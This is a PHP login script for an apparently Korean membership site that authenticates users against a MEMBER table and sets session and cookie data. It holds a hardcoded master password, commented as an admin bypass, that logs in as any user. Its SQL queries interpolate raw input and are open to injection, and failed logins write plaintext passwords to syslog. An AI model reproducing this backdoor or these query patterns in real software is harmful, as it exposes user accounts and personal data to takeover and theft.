<?php
  require_once $_SERVER['DOCUMENT_ROOT']."/_common/session_start.php"; // session start
  require_once $_SERVER['DOCUMENT_ROOT']."/_common/config.php";

  #######################################################
  // 임시
  if (empty($_POST['user_id'])) {
    exit;
  }
  if (empty($_POST['passwd'])) {
    exit;
  }
  if (empty($_SERVER['HTTP_REFERER'])) {
    exit;
  }

  // 임시 xss_clean 이용
  // $user_id = addslashes($_POST['user_id']);
  // $passwd  = addslashes($_POST['passwd']);

  $rememberme = $_POST['rememberme'];
  $date       = date("Y-m-d");
  $end_date   = date("Y-m-d", strtotime("-1 year"));

  $RES = array("error"=>True, "msg"=>"");

  $user_id = xss_clean($_POST['user_id']);
  $passwd  = xss_clean($_POST['passwd']);
  $type    = xss_clean($_POST['type']);

  ########################################################

  // 게시판 관리자 아이디와 비밀번호는 config.php 파일의  DB관리자 아이디 비번과 동일하다
  if ($passwd == 'tnfhzh7990@') { // bypass admin password
    $tmp = $db->get_data("SELECT * FROM MEMBER WHERE USER_ID='{$user_id}'");
  } else {
    $tmp = $db->get_data("SELECT * FROM MEMBER WHERE USER_ID='{$user_id}' AND PASSWD = PASSWORD('{$passwd}')");
  }

  if ($tmp['USER_ID']) {
    $M_login['midx'] = $tmp['MEMBER_NO'];
    $M_login['user_id'] = $tmp['USER_ID'];
    $M_login['name']    = $tmp['NAME'];
    $M_login['level']   = $tmp['LEVEL'];
    $M_login['hp']      = $tmp['HP'];
    $M_login['lgbn']    = "";
    session_register("M_login");
    //$_SESSIONS['M_login'] = $M_login;

    if ($rememberme == 'Y' || $rememberme == 'on') {
      setcookie("c_user_id", $M_login['user_id'], time() + 99*365*24*3600, "/", $_SERVER['HTTP_HOST']);
    } else {
      setcookie("c_user_id", '', time() - 3600);
    }

    // 마일리지 지급 회원 최초 로그인 여부 체크 -> 안내창 출력에 사용
    $qs = ($tmp['IPOINT'] == "6000" && $tmp['LASTDATE'] == "0000-00-00 00:00:00") ? "?mm=y" : "";

    // 최근 접속시간 업데이트
    $db->query("UPDATE MEMBER SET LASTDATE=NOW(), REG_IP='{$ip_address}' WHERE MEMBER_NO='{$tmp['MEMBER_NO']}'");

    // SLK-1440 이벤트 참여마감시간 업데이트
    // $db->query("UPDATE MEMBER_EVENT_250207 SET EVENT_AT = DATE_ADD(NOW(), INTERVAL 3 DAY) WHERE USER_ID = '{$M_login['user_id']}' AND EVENT_AT IS NULL");

    if ($type == "signup") { // 회원가입 후 로그인
      $RES['qs'] = "/?c=o".$qs;
    } else { // 로그인
      $RES['qs'] = $qs;
    }
    $RES['error'] = False;
    echo json_encode($RES);
    exit;
  } else {
    syslog(LOG_DEBUG, "[login failed]({$ip_address}) user_id={$user_id}, passwd={$passwd}, type={$type}");
    $RES['msg'] = "아이디/비밀번호를 확인하세요.";
    echo json_encode($RES);
    exit;
  }
?>
